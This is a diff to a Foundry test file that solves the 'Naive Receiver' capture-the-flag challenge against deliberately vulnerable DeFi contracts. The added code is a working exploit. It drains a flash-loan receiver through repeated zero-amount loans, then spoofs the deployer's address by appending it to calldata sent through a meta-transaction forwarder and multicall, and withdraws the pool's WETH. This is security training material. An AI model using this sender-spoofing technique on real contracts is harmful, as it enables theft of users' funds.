@@ -21,6 +21,16 @@ contract NaiveReceiverChallenge is Test {
     FlashLoanReceiver receiver;
     BasicForwarder forwarder;
 
+    struct Request {
+            address from;
+            address target;
+            uint256 value;
+            uint256 gas;
+            uint256 nonce;
+            bytes data;
+            uint256 deadline;
+    }
+
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
         _;
@@ -73,11 +83,46 @@ contract NaiveReceiverChallenge is Test {
         );
     }
 
+    bytes32 private constant _REQUEST_TYPEHASH = keccak256(
+        "Request(address from,address target,uint256 value,uint256 gas,uint256 nonce,bytes data,uint256 deadline"
+    );
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        console.log(player);
+
+        // flashloan
+        console.log("receiver weth: ", weth.balanceOf(address(receiver)) / 10**18);
+        console.log("pool weth: ", weth.balanceOf(address(pool)) / 10**18);
+        console.log("deployer deposited weth: ", pool.deposits(deployer));
+
+        //pool.flashLoan(receiver, address(weth), 0, "");
+
+        bytes[] memory data = new bytes[](11);
+        for (uint i = 0; i < 10; i++) {
+          data[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, ""));
+        }
+        data[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(player))), deployer);
+        bytes memory forwarderData = abi.encodeCall(pool.multicall, (data));
+
+        // forwarder
+
+        BasicForwarder.Request memory request = BasicForwarder.Request(player, address(pool), 0, 100000000, vm.getNonce(player), forwarderData, 1759497221);
+        bytes32 requestHash = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        (bool success,) = address(forwarder).call(abi.encodeCall(BasicForwarder.execute, (request, signature)));
+        require(success, "something wrong");
+
+        console.log("receiver weth: ", weth.balanceOf(address(receiver)) / 10**18);
+        console.log("fee weth deposits: ", pool.deposits(deployer) / 10**18);
+        console.log("player tx count: ", vm.getNonce(player));
+        console.log("player weth: ", weth.balanceOf(player) / 10**18);
+
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
